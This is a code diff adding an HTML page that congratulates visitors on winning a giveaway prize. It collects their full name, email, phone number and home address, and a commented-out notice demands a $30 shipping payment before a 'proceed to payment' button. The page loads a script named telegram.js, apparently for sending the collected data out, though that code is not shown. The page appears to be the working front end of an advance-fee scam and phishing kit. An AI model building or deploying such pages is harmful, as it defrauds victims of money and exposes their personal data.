@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>
+        INFORMATION 
+    </title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.13.1/font/bootstrap-icons.min.css">
+    <link rel="stylesheet" href="css/info.css">
+    <link rel="stylesheet" href="css/loading.css">
+    <link rel="icon" href="img/logo.png">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Alumni+Sans+SC:ital,wght@0,100..900;1,100..900&family=Edu+NSW+ACT+Cursive:wght@400..700&family=Mulish:ital,wght@0,200..1000;1,200..1000&family=PT+Serif:ital,wght@0,400;0,700;1,400;1,700&family=Roboto+Slab:wght@100..900&display=swap" rel="stylesheet">
+</head>
+<body>
+
+    <div class="loading">
+        <div class="spinner"></div>
+    </div>
+
+    <div class="top-text">
+        <b>
+            Congratulations
+        </b>
+    </div>
+
+    <section class="item-view">
+        <div>
+            <img id="prize-image" width="30%" height="50%">
+        </div>
+
+        <div>
+            <b id="prize-name"></b>
+        </div><br>
+
+        <div>
+            Congratulations on winning the giveaway price 
+            please provide your personal information below.
+        </div>
+
+        <div style="color: red;">
+            Ensure it's a correct infomation for your shipping item.
+        </div>
+
+        <form>
+            <div class="info-field">
+                <div class="label">
+                    Full Name
+                </div>
+
+                <div>
+                    <input class="name" type="text" required>
+                </div>
+                
+                <div class="label">
+                    Email Address
+                </div>
+
+                <div>
+                    <input class="email" type="email" required>
+                </div>
+
+                <div class="label">
+                    Phone Number
+                </div>
+
+                <div>
+                    <input class="number" type="tel" required>
+                </div>
+
+                <div class="label">
+                    Home Address
+                </div>
+
+                <div>
+                    <input class="address" type="text" required>
+                </div>
+
+                <div class="label">
+                    City
+                </div>
+
+                <div>
+                    <input class="city" type="text" required>
+                </div>
+
+                <div class="label">
+                    State
+                </div>
+
+                <div>
+                    <input class="state" type="text" required>
+                </div>
+
+                <div class="label">
+                    Zip code (optional)
+                </div>
+
+                <div>
+                    <input class="code" type="tel">
+                </div>
+
+                <div class="label">
+                    Country
+                </div>
+
+                <div>
+                    <input class="country" type="text" required>
+                </div>
+
+                <div>
+                    <button class="get-btn">
+                        Proceed to shipping
+                    </button>
+                </div>
+            </div>
+        </form>
+
+    </section>
+
+    <!--  -->
+
+    <section class="warning-section">
+        <!--<div>
+            <i class="bi bi-x-lg"></i>
+        </div>
+        <div class="warning-top">
+            <b>
+                Are you sure the informations provided below are correct shipping adddress
+            </b>
+        </div>
+
+        <div class="label">
+            <b>Fullname:</b> <span id="name"></span>
+        </div>
+
+        <div class="label">
+            <b>Email Address:</b> <span id="email"></span>
+        </div>
+
+        <div class="label">
+            <b>Phone Number:</b> <span id="number"></span>
+        </div>
+
+        <div class="label">
+            <b>Home Address:</b> <span id="home"></span>
+        </div>
+
+        <div class="label">
+            <b>City:</b> <span id="city"></span>
+        </div>
+
+        <div class="label">
+            <b>State:</b> <span id="state"></span>
+        </div>
+
+        <div class="label">
+            <b>Zip code:</b> <span id="code"></span>
+        </div>
+
+        <div class="label">
+            <b>Country:</b> <span id="country"></span>
+        </div>
+
+        <div class="imp-note">
+            <b>
+                Important Notice!!!
+            </b>
+        </div>
+
+        <div>
+            Dear <b><span id="name2"></span></b> you are to make a shipping payment of <b>$30.00</b> for your
+            giveaway prize item to be shipped to your above provided information which is already sent to us for your shipping.
+        </div>-->
+
+        <div>
+            <button class="get-btn2">
+                Procced to payment
+            </button>
+        </div>
+
+    </section>
+
+    <script src="telegram.js"></script>
+    <script src="js/info.js"></script>
+</body>
+</html>
